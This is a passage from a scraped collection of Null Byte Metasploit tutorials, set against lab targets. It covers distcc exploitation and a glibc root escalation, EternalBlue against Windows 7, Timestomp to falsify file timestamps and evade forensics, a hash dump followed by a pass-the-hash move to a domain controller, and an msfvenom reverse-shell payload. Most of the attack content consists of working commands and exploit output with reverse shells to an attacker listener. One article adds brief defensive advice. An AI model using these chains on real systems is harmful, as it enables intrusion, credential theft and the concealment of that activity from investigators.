advantage of combined processor power. Unfortunately, this version of the program allows a remote attacker to execute arbitrary commands on the server.\nWe can search for the exploit using the search command:\nmsf5 > search distcc\nMatching Modules\n================\n#  Name                           Disclosure Date  Rank       Check  Description\n-  ----                           ---------------  ----       -----  -----------\n0  exploit/unix/misc/distcc_exec  2002-02-01       excellent  Yes    DistCC Daemon Command Execution\nTo load the module, type use followed by the full path of the module:\nmsf5 > use exploit/unix/misc/distcc_exec\nWe can now see the available settings with the options command:\nmsf5 exploit(unix/misc/distcc_exec) > options\nModule options (exploit/unix/misc/distcc_exec):\nName    Current Setting  Required  Description\n----    ---------------  --------  -----------\nRHOSTS                   yes       The target address range or CIDR identifier\nRPORT   3632             yes       The target port (TCP)\nExploit target:\n0   Automatic Target\nIt looks like we only need to set the remote host address since the remote port is already set using the default port number. Use the set command to specify the appropriate IP address of the target:\nmsf5 exploit(unix/misc/distcc_exec) > set rhosts 10.10.0.50\nrhosts => 10.10.0.50\nNow we are ready to launch the exploit . Use the run command, which is just a shorter alias for exploit:\nmsf5 exploit(unix/misc/distcc_exec) > run\n[*] Started reverse TCP double handler on 10.10.0.1:4444\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo sWI9yfQYbPxuIGrh;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket B\n[*] B: \"sWI9yfQYbPxuIGrh\\r\\n\"\n[*] Matching...\n[*] A is input...\n[*] Command shell session 1 opened (10.10.0.1:4444 -> 10.10.0.50:58006) at 2019-11-19 11:46:02 -0500\nLinux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux\nWe can see that a command shell was opened, and running uname -a verifies we have compromised the target.\nStep 2: Upgrade to Meterpreter\nTo use Metasploit's local exploit suggester, we need to upgrade our basic Unix command shell to a Meterpreter session. While still in the basic command shell, press Ctrl-Z to background the session. Hit Y if it asks you to background it.\nBackground session 1? [y/N]  y\nmsf5 exploit(unix/misc/distcc_exec) >\nWe are now dropped back to the main Metasploit prompt, and we can verify any sessions we have running in the background with the sessions command:\nmsf5 exploit(unix/misc/distcc_exec) > sessions\nActive sessions\n===============\nId  Name  Type            Information  Connection\n--  ----  ----            -----------  ----------\n1         shell cmd/unix               10.10.0.1:4444 -> 10.10.0.50:58006 (10.10.0.50)\nThe easiest way to upgrade a regular shell to a Meterpreter session is to use the -u flag followed by the session number to upgrade:\nmsf5 exploit(unix/misc/distcc_exec) > sessions -u 1\n[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]\n[*] Upgrading session ID: 1\n[*] Starting exploit/multi/handler\n[*] Started reverse TCP handler on 10.10.0.1:4433\n[*] Sending stage (985320 bytes) to 10.10.0.50\n[*] Meterpreter session 2 opened (10.10.0.1:4433 -> 10.10.0.50:32979) at 2019-06-19 11:47:52 -0500\n[*] Command stager progress: 100.00% (773/773 bytes)\nWe can see the post module that runs and a new session is opened. We can again verify this with the sessions command:\nmsf5 exploit(unix/misc/distcc_exec) > sessions\nActive sessions\n===============\nId  Name  Type                   Information                                                Connection\n--  ----  ----                   -----------                                                ----------\n1         shell cmd/unix                                                                    10.10.0.1:4444 -> 10.10.0.50:58006 (10.10.0.50)\n2         meterpreter x86/linux  uid=1, gid=1, euid=1, egid=1 @ metasploitable.localdomain  10.10.0.1:4433 -> 10.10.0.50:32979 (10.10.0.50)\nAnd we can interact with our new Meterpreter session using the -i flag on the desired session:\nmsf5 exploit(unix/misc/distcc_exec) > sessions -i 2\n[*] Starting interaction with 2...\nmeterpreter >\nStep 3: Run Exploit Suggester\nMetasploit post modules work by running on a background session, not directly in the session itself, so background session 2 (our Meterpreter shell) and return to the main prompt. We can then load the local exploit suggester using the following command:\nmsf5 exploit(unix/misc/distcc_exec) > use post/multi/recon/local_exploit_suggester\nWhen we take a look at the options, we only need to specify the session we want to run this on:\nmsf5 post(multi/recon/local_exploit_suggester) > options\nModule options (post/multi/recon/local_exploit_suggester):\nName             Current Setting  Required  Description\n----             ---------------  --------  -----------\nSESSION                           yes       The session to run this module on\nSHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits\nSimply set the session to number 2, which is our Meterpreter shell:\nmsf5 post(multi/recon/local_exploit_suggester) > set session 2\nsession => 2\nAnd type run to kick it off:\nmsf5 post(multi/recon/local_exploit_suggester) > run\n[*] 10.10.0.50 - Collecting local exploits for x86/linux...\n[*] 10.10.0.50 - 26 exploit checks are being tried...\n[+] 10.10.0.50 - exploit/linux/local/glibc_ld_audit_dso_load_priv_esc: The target appears to be vulnerable.\n[+] 10.10.0.50 - exploit/linux/local/glibc_origin_expansion_priv_esc: The target appears to be vulnerable.\n[+] 10.10.0.50 - exploit/linux/local/netfilter_priv_esc_ipv4: The target appears to be vulnerable.\n[*] Post module execution completed\nWe can see the module checks a number of local exploits and returns a few that seem viable. Awesome.\nStep 4: Get Root\nThe final thing we need to do is use one of these exploits to get root on the system. We'll try the first one that was suggested to us. This exploit takes advantage of a vulnerability in the glibc dynamic linker, in which the LD_AUDIT environmental variable allows loading of a setuid object that ultimately runs with root privileges.\nmsf5 post(multi/recon/local_exploit_suggester) > use exploit/linux/local/glibc_ld_audit_dso_load_priv_esc\nLooking at the options, we only need to set the session again — the default executable path will work for now:\nmsf5 exploit(linux/local/glibc_ld_audit_dso_load_priv_esc) > options\nModule options (exploit/linux/local/glibc_ld_audit_dso_load_priv_esc):\nName             Current Setting  Required  Description\n----             ---------------  --------  -----------\nSESSION                           yes       The session to run this module on.\nSUID_EXECUTABLE  /bin/ping        yes       Path to a SUID executable\nExploit target:\n0   Automatic\nSet the session just like before:\nmsf5 exploit(linux/local/glibc_ld_audit_dso_load_priv_esc) > set session 2\nsession => 2\nWe can also set the payload to give us another Meterpreter session when the exploit completes:\nmsf5 exploit(linux/local/glibc_ld_audit_dso_load_priv_esc) > set payload linux/x86/meterpreter/reverse_tcp\npayload => linux/x86/meterpreter/reverse_tcp\nAnd set the appropriate listening host (the IP address of our local machine) and port:\nmsf5 exploit(linux/local/glibc_ld_audit_dso_load_priv_esc) > set lhost 10.10.0.1\nlhost => 10.10.0.1\nmsf5 exploit(linux/local/glibc_ld_audit_dso_load_priv_esc) > set lport 4321\nlport => 4321\nFinally, type run to launch the exploit:\nmsf5 exploit(linux/local/glibc_ld_audit_dso_load_priv_esc) > run\n[*] Started reverse TCP handler on 10.10.0.1:4321\n[+] The target appears to be vulnerable\n[*] Using target: Linux x86\n[*] Writing '/tmp/.BlrZu4n' (1271 bytes) ...\n[*] Writing '/tmp/.18qZUt' (281 bytes) ...\n[*] Writing '/tmp/.DoiFwlxPt' (207 bytes) ...\n[*] Launching exploit...\n[*] Sending stage (985320 bytes) to 10.10.0.50\n[*] Meterpreter session 3 opened (10.10.0.1:4321 -> 10.10.0.50:56950) at 2019-11-19 11:57:19 -0500\nmeterpreter >\nWe now have a new Meterpreter session on the target, and we can drop into a shell to verify we have obtained root access:\nmeterpreter > shell\nProcess 4886 created.\nChannel 1 created.\nuid=0(root) gid=0(root) groups=1(daemon)\nLinux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux\nWrapping Up\nIn this tutorial, we learned how to use Metasploit to get a shell on the target, upgrade that shell to a Meterpreter session, and use the local exploit suggester module to ultimately get root on the system. Metasploit not only makes initial exploitation easy but the post-exploitation phase as well. In the next article, we will explore some useful post modules to quickly gather information about the target.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover image by Pixabay/Pexels; Screenshots by drd_/Null Byte",
        "category": "Metasploit Basics"
    },
    {
        "title": "Use Metasploit's Timestomp to Modify File Attributes & Avoid Detection",
        "link": "https://null-byte.wonderhowto.com/how-to/use-metasploits-timestomp-modify-file-attributes-avoid-detection-0196629/",
        "content": "* WonderHowTo\nIt is said that the best way to avoid detection when hacking is to leave no trace, and often that means not touching the filesystem at all. But realistically, in most cases, it's impossible not to interact with the filesystem in one way or another. The next best thing to do to throw off any investigators is to change the file attributes to hide activity. We can do this with Metasploit's Timestomp.\nWhat Are MACE Values?\nMACE (modified, accessed, created, entry) values are file attributes that describe the dates and times of activity on a file. These attributes are used by administrators to determine when a file was last accessed or changed, and they can often be used to trace malicious activity.\n* Don't Miss: Perform a Pass-the-Hash Attack & Get System Access on Windows\nThe best course of action when hacking is to leave no trace behind at all, but modifying MACE attributes might be the next best thing. This method is not infallible, but it can help obscure your activity on the filesystem.\nCommon sense must be utilized, though, as dates far in the past (or future) can be a dead giveaway of hacking activity. Changing all four attributes to the same date and time is also a giveaway since this would be impossible.\nStep 1: Set Up Everything\nWe will be using a copy of Windows 7 as our mark, and Kali Linux as our attacking machine. The first thing we need to do is create some sample files on the target. I also created a new folder named \"MyFiles\" to keep them in to stay organized. It doesn't matter what these are — some basic text files will be more than enough.\nOn Amazon: 'Metasploit for Beginners: Create a threat-free environment with the best-in-class tool'\nStep 2: Get a Meterpreter Session\nNow that we are all set on that end, fire up Metasploit on our attacking machine by typing msfconsole in the terminal.\n~# msfconsole\nThis target is vulnerable to EternalBlue, so I will use that to get a shell. It doesn't matter what you use, though, as long as you end up with a Meterpreter session on the target.\nmsf5 > use exploit/windows/smb/ms17_010_eternalblue\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > run\n[*] Started reverse TCP handler on 10.10.0.1:1234\n[*] 10.10.0.104:445 - Connecting to target for exploitation.\n[+] 10.10.0.104:445 - Connection established for exploitation.\n[+] 10.10.0.104:445 - Target OS selected valid for OS indicated by SMB reply\n[*] 10.10.0.104:445 - CORE raw buffer dump (42 bytes)\n[*] 10.10.0.104:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes\n[*] 10.10.0.104:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv\n[*] 10.10.0.104:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1\n[+] 10.10.0.104:445 - Target arch selected valid for arch indicated by DCE/RPC reply\n[*] 10.10.0.104:445 - Trying exploit with 12 Groom Allocations.\n[*] 10.10.0.104:445 - Sending all but last fragment of exploit packet\n[*] 10.10.0.104:445 - Starting non-paged pool grooming\n[+] 10.10.0.104:445 - Sending SMBv2 buffers\n[+] 10.10.0.104:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.\n[*] 10.10.0.104:445 - Sending final SMBv2 buffers.\n[*] 10.10.0.104:445 - Sending last fragment of exploit packet!\n[*] 10.10.0.104:445 - Receiving response from exploit packet\n[+] 10.10.0.104:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!\n[*] 10.10.0.104:445 - Sending egg to corrupted connection.\n[*] 10.10.0.104:445 - Triggering free of corrupted buffer.\n[*] Sending stage (206403 bytes) to 10.10.0.104\n[*] Meterpreter session 1 opened (10.10.0.1:1234 -> 10.10.0.104:49233) at 2019-04-08 10:41:26 -0500\n[+] 10.10.0.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 10.10.0.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 10.10.0.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\nmeterpreter >\nStep 3: Verify the Files on the Target\nNow that we have compromised the target, issue the pwd command to view the current working directory.\nmeterpreter > pwd\nC:\\Windows\\system32\nSince we created a new folder on the C drive, we can navigate there and confirm the files we created earlier exist.\nmeterpreter > cd C:/Myfiles\nmeterpreter > ls\nListing: C:\\Myfiles\n===================\nMode              Size  Type  Last modified              Name\n----              ----  ----  -------------              ----\n100666/rw-rw-rw-  12    fil   2019-04-08 12:43:24 -0500  example.txt\n100666/rw-rw-rw-  7     fil   2019-04-08 12:43:55 -0500  test1.txt\n100666/rw-rw-rw-  13    fil   2019-04-08 12:43:55 -0500  test2.txt\n100666/rw-rw-rw-  127   fil   2019-04-08 12:43:55 -0500  test3.txt\nStep 4: Change File Attributes with Timestomp\nTimestomp is a post-exploitation module available in Meterpreter that can be used to modify the MACE values of files. It is useful because we can change the times and dates of any files we access, minimizing the risk of being caught.\nIn a Meterpreter session, use timestomp help to display the help menu for this module:\nmeterpreter > timestomp help\nUsage: timestomp <file(s)> OPTIONS\n-a <opt>  Set the \"last accessed\" time of the file\n-b        Set the MACE timestamps so that EnCase shows blanks\n-c <opt>  Set the \"creation\" time of the file\n-e <opt>  Set the \"mft entry modified\" time of the file\n-f <opt>  Set the MACE of attributes equal to the supplied file\n-h        Help banner\n-m <opt>  Set the \"last written\" time of the file\n-r        Set the MACE timestamps recursively on a directory\n-v        Display the UTC MACE values of the file\n-z <opt>  Set all four attributes (MACE) of the file\n1. View MACE Values for a File\nProvide the file and the desired option to perform an action. For example, to view the MACE values of a file, use the -v flag.\nmeterpreter > timestomp example.txt -v\n[*] Showing MACE attributes for example.txt\nModified      : 2019-04-08 13:44:25 -0500\nAccessed      : 2019-04-08 13:43:24 -0500\nCreated       : 2019-04-08 13:43:24 -0500\nEntry Modified: 2019-04-08 13:44:25 -0500\n2. Change Modified, Accessed, Created & Entry Modified Values\nWe can change any of these attributes by using the appropriate option and a valid DateTime format. To change the \"modified\" value, use the -m flag.\nmeterpreter > timestomp example.txt -m \"02/14/2012 08:10:03\"\n[*] Setting specific MACE attributes on example.txt\nNow when we view the file attributes, we can see that this has changed.\nmeterpreter > timestomp example.txt -v\n[*] Showing MACE attributes for example.txt\nModified      : 2012-02-14 08:10:03 -0600\nAccessed      : 2019-04-08 13:43:24 -0500\nCreated       : 2019-04-08 13:43:24 -0500\nEntry Modified: 2019-04-08 13:44:25 -0500\nWe can do this for the \"accessed\" value as well using the -a flag.\nmeterpreter > timestomp example.txt -a \"02/14/2012 08:10:03\"\n[*] Setting specific MACE attributes on example.txt\nAnd the \"created\" value with the -c flag.\nmeterpreter > timestomp example.txt -c \"03/11/1999 10:05:01\"\n[*] Setting specific MACE attributes on example.txt\nAnd finally, the \"entry modified\" value using the -e flag.\nmeterpreter > timestomp example.txt -e \"04/25/2018 11:11:08\"\n[*] Setting specific MACE attributes on example.txt\nNow when we view the file, we can see all these changes have gone into effect.\nmeterpreter > timestomp example.txt -v\n[*] Showing MACE attributes for example.txt\nModified      : 2012-02-14 08:10:03 -0600\nAccessed      : 2012-02-14 08:10:03 -0600\nCreated       : 1999-03-11 10:05:01 -0600\nEntry Modified: 2018-04-25 12:11:08 -0500\n3. Change All Values at the Same Time\nWe can also change these attributes all at once if we wanted the values all to be the same — use the -z flag to do so.\nmeterpreter > timestomp example.txt -z \"10/15/2017 05:30:22\"\n[*] Setting specific MACE attributes on example.txt\nAnd now they all have changed again.\nmeterpreter > timestomp example.txt -v\n[*] Showing MACE attributes for example.txt\nModified      : 2017-10-15 06:30:22 -0500\nAccessed      : 2017-10-15 06:30:22 -0500\nCreated       : 2017-10-15 06:30:22 -0500\nEntry Modified: 2017-10-15 06:30:22 -0500\n4. Match Values with Another File\nThere is also an interesting option to set the MACE attributes equivalent to an existing file on the system by using the -f flag, but I couldn't get this to work.\nmeterpreter > timestomp example.txt -f C:\\\\Windows\\\\notepad.exe\n[*] Pulling MACE attributes from C:\\Windows\\notepad.exe\n[-] priv_fs_get_file_mace: Operation failed: The handle is invalid.\n5. Remove All Values\nWe can totally blank the file attributes, too, using the -b flag.\nmeterpreter > timestomp example.txt -b\n[*] Blanking file MACE attributes on example.txt\nNow when we view the file, it shows the nonsensical values as dates in the future, which is obviously impossible.\nmeterpreter > timestomp example.txt -v\n[*] Showing MACE attributes for example.txt\nModified      : 2106-02-07 00:28:15 -0600\nAccessed      : 2106-02-07 00:28:15 -0600\nCreated       : 2106-02-07 00:28:15 -0600\nEntry Modified: 2106-02-07 00:28:15 -0600\nWe can also blank all files recursively in the current directory with the -r flag.\nmeterpreter > timestomp ./ -r\n[*] Blanking directory MACE attributes on ./\nWhen we look at the files on the target now, the dates show up as blank.\nWrapping Up\nToday, we learned a little about MACE values of files and how they pertain to forensics. After we initially compromised our target and gained a Meterpreter session, we explored Timestomp and how it can be used to modify MACE attributes to avoid detection. However, take this with a grain of salt — modifying file attributes is better than nothing when trying to remain hidden, but it is not perfect. Stay frosty, white hats.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover image by Free-Photos/Pixabay; Screenshots by drd_/Null Byte",
        "category": "Metasploit Basics"
    },
    {
        "title": "Perform a Pass-the-Hash Attack & Get System Access on Windows",
        "link": "https://null-byte.wonderhowto.com/how-to/perform-pass-hash-attack-get-system-access-windows-0196077/",
        "content": "* WonderHowTo\nPasswords on Windows are stored as hashes, and sometimes they can be tough to crack. In certain situations, though, we can get around that by using the hash as is, with no need to know the plaintext password. It's especially interesting if we can manage to get the hash of an administrative user since we can then authenticate with higher privileges by performing an attack known as pass the hash.\nWe will be initially compromising a Windows 7 box, grabbing a hash from there, and pivoting to Windows Server 2016. The user whose password hash we obtain needs to have administrative privileges and to have been logged on to both of these machines. We will be using Kali Linux as our attacking box.\n* Don't Miss: Discover Open Ports Using Metasploit's Built-in Port Scanner\nPass the Hash Overview\nTo understand the pass-the-hash technique, we first need to cover what makes up the hash. On Windows, a typical hash will look something like this:\nadmin2:1000:aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7:::\nThere are four distinct sections, each separated by a semicolon. The first part of the hash is the username, and the second part is the numerical relative identifier.\nThe third part is the LM hash, a type of hash that was used in older Windows systems and was discontinued starting with Vista/Server 2008. You don't see these much anymore, but it is still possible to come across them if older systems are still in use. If you do, consider yourself lucky because they are trivial to crack.\nThe fourth part is the NTLM hash, an updated version used on modern Windows systems that is much harder to crack. It's also sometimes referred to as the NTHash, and it's what we can use to pass the hash.\n* Don't Miss: Crack Shadow Hashes After Getting Root on a Linux System\nOur attack works because of the way passwords are stored, transmitted, and used to authenticate. Think about it: your password isn't being thrown around the network in plaintext for everyone to see — it is cryptographically hashed from the moment of creation.\nWhen authenticating with a username and password, the password is hashed once you type it in. All things considered, the computer doesn't see a difference between the password and the hash in the end. So by providing the authentication mechanism with the hash directly, we can bypass the need to know the plaintext password.\nThings get especially interesting because as long as we know the username, we can authenticate as an administrator with just the password hash.\nStep 1: Grab the Hash from Initial Target\nThe first thing we need to do is compromise the initial target. In this scenario, we will assume this is a regular workstation (our Windows 7 machine). Any method will work, but for now, let's assume this machine is vulnerable to cd EternalBlue.\nWe can use Metasploit to easily own the target. First, start it up:\n~# msfconsole\nThen, let's run an \"eternalblue\" module. For more information on this module, check out my previous guide on exploiting EternalBlue on a Windows server.\nmsf5 > use exploit/windows/smb/ms17_010_eternalblue\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > run\n[*] Started reverse TCP handler on 10.10.0.1:1234\n[*] 10.10.0.104:445 - Connecting to target for exploitation.\n[+] 10.10.0.104:445 - Connection established for exploitation.\n[+] 10.10.0.104:445 - Target OS selected valid for OS indicated by SMB reply\n[*] 10.10.0.104:445 - CORE raw buffer dump (42 bytes)\n[*] 10.10.0.104:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes\n[*] 10.10.0.104:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv\n[*] 10.10.0.104:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1\n[+] 10.10.0.104:445 - Target arch selected valid for arch indicated by DCE/RPC reply\n[*] 10.10.0.104:445 - Trying exploit with 12 Groom Allocations.\n[*] 10.10.0.104:445 - Sending all but last fragment of exploit packet\n[*] 10.10.0.104:445 - Starting non-paged pool grooming\n[+] 10.10.0.104:445 - Sending SMBv2 buffers\n[+] 10.10.0.104:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.\n[*] 10.10.0.104:445 - Sending final SMBv2 buffers.\n[*] 10.10.0.104:445 - Sending last fragment of exploit packet!\n[*] 10.10.0.104:445 - Receiving response from exploit packet\n[+] 10.10.0.104:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!\n[*] 10.10.0.104:445 - Sending egg to corrupted connection.\n[*] 10.10.0.104:445 - Triggering free of corrupted buffer.\n[*] Sending stage (206403 bytes) to 10.10.0.104\n[*] Meterpreter session 1 opened (10.10.0.1:1234 -> 10.10.0.104:49210) at 2019-04-08 10:29:38 -0500\n[+] 10.10.0.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 10.10.0.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 10.10.0.104:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\nmeterpreter >\nMeterpreter has a useful command called hashdump that will dump any LM or NTLM hashes present on the system.\nmeterpreter > hashdump\nadmin2:1000:aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7:::\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nIt appears there is a user named \"admin2\" that likely has administrative privileges. We can copy the hash and use it to connect to another machine.\nLet's say there is another computer on the network that looks like a server, possibly a domain controller (this will be the Windows Server 2016 box). If we can get access to that machine we could own the entire network and any computer on the domain.\nStep 2: Pass the Hash with PsExec\nNow that we have the hash of a privileged user, we can use it to authenticate to the Windows Server 2016 box without supplying the plaintext password. We can do this with Metasploit's psexecmodule.\nPsExec is a command-line tool on Windows that allows you to execute programs and commands on remote systems. It is useful for administrators because it integrates with console applications and utilities for seamless redirection of input and output. But there is always a trade-off between convenience and security. PsExec can be abused by an attacker to execute malicious commands or to serve as a backdoor.\nMetasploit contains a modified version of PsExec that makes it easy to connect to remote targets. Use the search command to locate the module:\nmsf5 > search psexec\nMatching Modules\n================\n#   Name                                         Disclosure Date  Rank       Check  Description\n-   ----                                         ---------------  ----       -----  -----------\n1   auxiliary/admin/smb/ms17_010_command         2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution\n2   auxiliary/admin/smb/psexec_command                            normal     Yes    Microsoft Windows Authenticated Administration Utility\n3   auxiliary/admin/smb/psexec_ntdsgrab                           normal     No     PsExec NTDS.dit And SYSTEM Hive Download Utility\n4   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal     Yes    DCOM Exec\n5   auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal     Yes    WMI Exec\n6   auxiliary/scanner/smb/psexec_loggedin_users                   normal     Yes    Microsoft Windows Authenticated Logged In Users Enumeration\n7   encoder/x86/service                                           manual     No     Register Service\n8   exploit/windows/local/current_user_psexec    1999-01-01       excellent  No     PsExec via Current User Token\n9   exploit/windows/local/wmi                    1999-01-01       excellent  No     Windows Management Instrumentation (WMI) Remote Command Execution\n10  exploit/windows/smb/ms17_010_psexec          2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\n11  exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution\n12  exploit/windows/smb/psexec_psh               1999-01-01       manual     No     Microsoft Windows Authenticated Powershell Command Execution\n13  exploit/windows/smb/webexec                  2018-10-24       manual     No     WebExec Authenticated User Code Execution\nIt's an oldie but a goodie. Load it up with the use command.\nmsf5 > use exploit/windows/smb/psexec\nNow we can display the current settings with the options command.\nmsf5 exploit(windows/smb/psexec) > options\nModule options (exploit/windows/smb/psexec):\nName                  Current Setting  Required  Description\n----                  ---------------  --------  -----------\nRHOSTS                                 yes       The target address range or CIDR identifier\nRPORT                 445              yes       The SMB service port (TCP)\nSERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing\nSERVICE_DISPLAY_NAME                   no        The service display name\nSERVICE_NAME                           no        The service name\nSHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share\nSMBDomain             .                no        The Windows domain to use for authentication\nSMBPass                                no        The password for the specified username\nSMBUser                                no        The username to authenticate as\nExploit target:\n0   Automatic\nFirst, we need to set the IP address of the target (the server we are now targeting):\nmsf5 exploit(windows/smb/psexec) > set rhosts 10.10.0.100\nrhosts => 10.10.0.100\nThen we can set the username and password, using the hash we obtained instead of a plaintext password.\nmsf5 exploit(windows/smb/psexec) > set smbuser admin2\nsmbuser => admin2\nmsf5 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7\nsmbpass => aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7\nNext, set the payload — we will use the classic Meterpreter reverse TCP.\nmsf5 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp\npayload => windows/x64/meterpreter/reverse_tcp\nAnd the IP address of our local machine and a desired port.\nmsf5 exploit(windows/smb/psexec) > set lhost 10.10.0.1\nlhost => 10.10.0.1\nmsf5 exploit(windows/smb/psexec) > set lport 1234\nlport => 1234\nThe rest of the default options are fine for now, so we should be good to go. Fire it off with the run command.\nmsf5 exploit(windows/smb/psexec) > run\n[*] Started reverse TCP handler on 10.10.0.1:1234\n[*] 10.10.0.100:445 - Connecting to the server...\n[*] 10.10.0.100:445 - Authenticating to 10.10.0.100:445 as user 'admin2'...\n[*] 10.10.0.100:445 - Selecting PowerShell target\n[*] 10.10.0.100:445 - Executing the payload...\n[*] Sending stage (206403 bytes) to 10.10.0.100\n[+] 10.10.0.100:445 - Service start timed out, OK if running a command or non-service executable...\n[*] Meterpreter session 2 opened (10.10.0.1:1234 -> 10.10.0.100:49864) at 2019-04-08 10:36:37 -0500\nmeterpreter >\nAnd we now have a Meterpreter session. To confirm, we can issue commands like getuid and sysinfo to display information about the target.\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter > sysinfo\nComputer        : DC01\nOS              : Windows 2016 (Build 14393).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : DLAB\nLogged On Users : 4\nMeterpreter     : x64/windows\nPretty neat. We didn't even need a password — only the hash — to get access to the server. We now own this system.\nIt is generally pretty difficult to defend against a pass-the-hash attack because it ends up looking like standard authentication. The best thing to do is implement a defense-in-depth approach to mitigate potential damage.\nKeeping privileges to a minimum will negate the amount of damage an attacker can do if they gain an initial foothold in the network. Other standard defense methods should be utilized as well, such as the use of a firewall and IDS/IPS to monitor and prevent any malicious activity.\nWindows can also be configured not to cache credentials, which would prevent attackers from harvesting hashes stored in memory. Additional steps can be taken as well to isolate sensitive systems on the network to limit an attacker's ability to pivot.\nIn this tutorial, we learned about Windows hashes, how they are used in authentication, and how they can be abused to perform a pass-the-hash attack. After we compromised a low-level target, we dumped the hashes and found an administrative account. From there, we used Metasploit to pass the hash and ultimately get System access on a server. If you have any questions on any of this, ask them below.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover image by rawpixel/Pexels",
        "category": "Metasploit Basics"
    },
    {
        "title": "Bypass UAC & Escalate Privileges on Windows Using Metasploit",
        "link": "https://null-byte.wonderhowto.com/how-to/bypass-uac-escalate-privileges-windows-using-metasploit-0196076/",
        "content": "* WonderHowTo\nUAC is something we've all dealt with on Windows, either as a user, administrator, or attacker. It's a core feature of the Windows security model, and for the most part, it does what it's supposed to. But it can be frustrating as a hacker when attempting privilege escalation, but it's easy enough to bypass UAC and obtain System access with Metasploit.\nIn our demonstration here, we will be using Kali Linux to attack a Windows 7 box. If you have access to a practice Windows 7 computer, feel free to follow along step by step, but it will also work on other Windows versions. However, for this to work, there needs to be a user with administrative privileges on the target machine, so make sure that's the case.\nUAC Overview\nUAC, or User Account Control, is a security feature of Windows that works by limiting what a standard user can do until an administrator authorizes a temporary increase of privileges. We've all dealt with the annoying pop-up when trying to install software or run a specific program, but this feature helps to keep malware at bay by only allowing applications to run with higher privileges on an as-needed basis.\n* Don't Miss: How to Create an Undetectable Payload for Windows 10\nThis feature was first introduced in Windows Vista and is still present on Microsoft operating systems today. It can be disabled, but any decent system administrator would never allow that to happen. From an attacker's standpoint, this can make it challenging to elevate privileges on a user, because even if that user has administrative rights, UAC will prevent escalation.\nMeterpreter has a built-in command to get System, but if UAC is enabled, it won't work. Luckily, there is a way to get around this. With a few steps, Metasploit makes it easy to bypass UAC, escalate privileges, and own the system.\nStep 1: Compromise the Target\nTo begin, let's create a temporary directory to work out of, just to keep things clean.\n~# mkdir temp\n~# cd temp/\nThe first thing we need to do is get a low privilege shell on the target. For demonstration purposes, we will create a simple payload using MSFvenom and save it as an executable to be run on the target.\n~/temp# msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.0.1 lport=1234 -f exe -o pwn.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of exe file: 7168 bytes\nSaved as: pwn.exe\nHere's what is happening in the command above:\n* the -p flag specifies the payload\n* lhost is our local machine to connect back to\n* lport is the local port to 